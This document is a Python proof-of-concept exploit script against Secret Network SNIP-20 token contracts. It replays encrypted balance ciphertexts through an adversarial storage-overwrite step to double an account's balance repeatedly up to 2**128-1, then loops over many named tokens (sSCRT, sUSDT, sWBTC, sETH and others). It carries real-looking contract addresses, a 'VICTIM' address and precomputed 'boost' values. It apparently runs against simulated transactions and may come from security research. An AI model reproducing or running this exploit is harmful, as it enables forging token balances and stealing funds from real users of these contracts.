import time
import json
import tempfile
import os
import sys
import random, glob, pickle
from base64 import b64encode

from utils import query_native, query_contract, get_codehash, generate_and_sign_tx, generate_and_sign_transfer, simulate_tx
from utils import set_snapshot, clear_snapshot, clear_outputs
from utils import set_snip20viewing_key, query_snip20balance
from params_main import SECRETD, ATTACK_DIR, BAL_KEYS, TOKENS

UNIQUE_LABEL=str(time.time())

ACC0='secret1yhj0m3g8qramjjtv7g6quaqzdj77wwls4l555q'
ACC1='secret1uh83vxunp4jrnm47744wkzur5cfsfar959c74v'
SSCRT="secret1k0jntykt7e4g3y88ltc60czgjuqdy4c9e8fzek"
VICTIM="secret1klkjyu278c72rcwe46el769vgv4vdqjrcg5533"

SSCRT_HASH = get_codehash(SSCRT)

SETH = TOKENS['SETH']['addr']
SETH_HASH = get_codehash(SETH)

SETH_SSCRT = 'secret14zv2fdsfwqzxqt7s2ushp4c4jr56ysyld5zcdf'
SETH_SSCRT_HASH = get_codehash(SETH_SSCRT)

# Load list of tokens and how to swap to them from SSCRT
from boost_params import _DATA, _BOOSTS
for line in _DATA.split('\n')[1:-1]:
    symb,addr,swapoffer,swapaddr = line.split(',')
    TOKENS[symb] = {'addr':addr,
                    'swapoffer':swapoffer,
                    'swapaddr':swapaddr}

for (token,(acc0key,boost)) in _BOOSTS.items():
    TOKENS[token]['boost'] = boost
    TOKENS[token]['acc0key'] = acc0key

TOKENS['SSCRT']['boost'] = "d782b7b17349f894b86225ac4dc640c95e27b10b7e9b66d1eda85e9d630c0d3c964c1ae5b70e02c8799d7d5826fe4b81f5cf7f64b1779108a9646c98e786ddeb"
TOKENS['SSCRT']['acc0key'] = "2e7a914390d26ef1f7e6bef4b98b9e37030e5f475520d79e0d5d9a2065c48338"

def overwrite_entry(key,value):
    open(f"{ATTACK_DIR}/adv_key","w").write(key)
    open(f"{ATTACK_DIR}/adv_value","w").write(value)

def secretswap(token,sender,swapper):
    msg = b'{"swap":{"expected_return":"1"}}'
    msg = b64encode(msg).decode('utf-8')
    query = {"send":
             {"recipient":swapper,
              "amount":"1000",
              "msg": msg}}
    tx = generate_and_sign_tx(token,sender,query)
    r = simulate_tx(tx)
    assert(r is not None)
    return True

def boost_addr(contract):
    # TODO: It would be great to make this more flexible,
    # so we don't have to start off with exactly 10000 initial units.
    # This would require viewing keys to be working for us
    q = query_snip20balance(contract,ACC0)
    print('Initial balance of ACC0:', q)
    bal0 = int(q['balance']['amount'])
    goal = 2**128-1
    while bal0 < goal:
        # Transaction 1: Send the balance from ACC0 to ACC1
        tx = generate_and_sign_transfer(contract,ACC0,ACC1,bal0)
        replay = simulate_tx(tx)
        assert(replay is not None)


        # Replay the values we just read and prepare
        #   for the next transaction.
        # Item 1 is the sender's balance for this SNIP20 transfer.
        # So this replay value has the original ACC0 balance.
        replay_item = replay[1]
        # assert(BAL_KEYS['SSCRT'][ACC0]==replay_item[0])
        replay_val = replay_item[1]
        overwrite_entry(replay_item[0], replay_item[1])
        
        # Transaction 2: Send back the full amount from ACC1
        #  to ACC0, using the replayed value.
        #  Effectively doubles ACC0's balance.
        amt = min(goal-bal0,bal0)
        assert(simulate_tx(generate_and_sign_transfer(contract,ACC1,ACC0,amt)))
        clear_outputs()
        bal0 += amt
        def abbrev(s, m=10): return s[:m]+'...'+s[-m:]
        print('balance:', bal0, 'ciphertext:', abbrev(replay_item[1]))

    tx = generate_and_sign_transfer(contract,ACC0,ACC0,2**128-1)
    replay = simulate_tx(tx)
    replay_item = replay[1]
    print('Boosted max value:', replay_item[1])
    return replay_item[0], replay_item[1]


if 0:
    tokens = ['SUSDT','SUSDC', 'SWBTC','stkd-SCRT',
              'SXMR',
              'SIENNA', 'SHD', 'SETH',
              'SEFI', 'SDAI', 'ALTER', 'SUSDC(BSC)']
    for token in tokens:
        if 'boost' not in TOKENS[token]: continue

        UNIQUE_LABEL=time.time()        
        snapname= f"{UNIQUE_LABEL}_boost"
        set_snapshot(snapname)
        tokenaddr = TOKENS[token]['addr']
        set_snip20viewing_key(tokenaddr,ACC0)
        print(f"[{token}]:", query_snip20balance(tokenaddr,ACC0))

        boost = TOKENS[token]['boost']
        key   = TOKENS[token]['acc0key']
        print(f"boost['{token}'] = ('{key}','{boost}')")

        tokenaddr = TOKENS[token]['addr']
        swapoffer = TOKENS[token]['swapoffer']
        swapaddr  = TOKENS[token]['swapaddr']
        offeraddr = TOKENS[swapoffer]['addr']

        set_snip20viewing_key(offeraddr,ACC0)
        print(f"[{swapoffer}]:", query_snip20balance(offeraddr,ACC0))
        print(f"[{token}]:", query_snip20balance(tokenaddr,ACC0))        
        print('Swapping:', secretswap(offeraddr,ACC0,swapaddr))
        print(f"[{swapoffer}]:", query_snip20balance(offeraddr,ACC0))
        print(f"[{token}]:", query_snip20balance(tokenaddr,ACC0))

        #(key,boost) = boost_addr(tokenaddr)

        clear_outputs()
        overwrite_entry(TOKENS[token]['acc0key'],
                        TOKENS[token]['boost'])
        
        bal = query_snip20balance(tokenaddr,ACC0)
        print(f"After boosting [{token}] balance:", bal)
        


"""Also the first time we visit a new SNIP-20 token,
we need to simulate purchasing some amount.
We could do this by simulating a Sienna Swap transaction.
We would also need to simulate a viewing key.
"""
if 0:
    """Query diagnostics"""
    # secretd query bank balances $ACC0
    print(query_native(ACC0))
    print(query_native(ACC1))
    print(query_contract(SSCRT, {"exchange_rate":{}}))

    
if __name__ == '__main__':

    tokens = ['SSCRT','SUSDT','SUSDC', 'SWBTC','stkd-SCRT',
              'SXMR',
              'SIENNA', 'SHD', 'SETH',
              'SEFI', 'SDAI', 'ALTER', 'SUSDC(BSC)',
              'SBNB(BSC)']
    print(tokens)
    for token in tokens:
        if token == 'SSCRT':
            set_snip20viewing_key(SSCRT,ACC0)
            sscrt_bal = query_snip20balance(SSCRT,ACC0)
            print("SSCRT balance:", sscrt_bal)
            continue

        if 'boost' in TOKENS[token]:
            print('Already have boost for:', token)
            continue

        tokenaddr = TOKENS[token]['addr']
        swapoffer = TOKENS[token]['swapoffer']
        swapaddr  = TOKENS[token]['swapaddr']
        offeraddr = TOKENS[swapoffer]['addr']
        print('Boosting for', token, 'by selling', swapoffer)
        print(TOKENS[token])
        
        clear_outputs()
        UNIQUE_LABEL=time.time()        
        snapname= f"{UNIQUE_LABEL}_boost"
        set_snapshot(snapname)

        clear_outputs()
        if swapoffer != 'SSCRT':
            # We will assume that we're only 1 hop away from SSCRT.
            # We need to "initialize" a token using swap,
            #   can't *just* set the balance
            assert(TOKENS[swapoffer]['swapoffer'] == 'SSCRT')
            swa = TOKENS[swapoffer]['swapaddr']
            sscr = TOKENS['SSCRT']['addr']
            print('Swapping:', secretswap(sscr,ACC0,swa))

        set_snip20viewing_key(offeraddr,ACC0)
        set_snip20viewing_key(tokenaddr,ACC0)
        print(f"[{swapoffer}]:", query_snip20balance(offeraddr,ACC0))
        print(f"[{token}]:", query_snip20balance(tokenaddr,ACC0))        
            
        overwrite_entry(TOKENS[swapoffer]['acc0key'],
                        TOKENS[swapoffer]['boost'])

        print(f"[{swapoffer}]:", query_snip20balance(offeraddr,ACC0))
        print(f"[{token}]:", query_snip20balance(tokenaddr,ACC0))        
        print('Swapping:', secretswap(offeraddr,ACC0,swapaddr))
        print(f"[{swapoffer}]:", query_snip20balance(offeraddr,ACC0))
        print(f"[{token}]:", query_snip20balance(tokenaddr,ACC0))

        (key,boost) = boost_addr(tokenaddr)
        TOKENS[token]['boost'] = boost
        TOKENS[token]['acc0key'] = key
        print(f"boost['{token}'] = ('{key}','{boost}')")
        bal = query_snip20balance(tokenaddr,ACC0)
        print(f"After boosting [{token}] balance:", bal)

        
    

        
    #boost_addr(SETH)
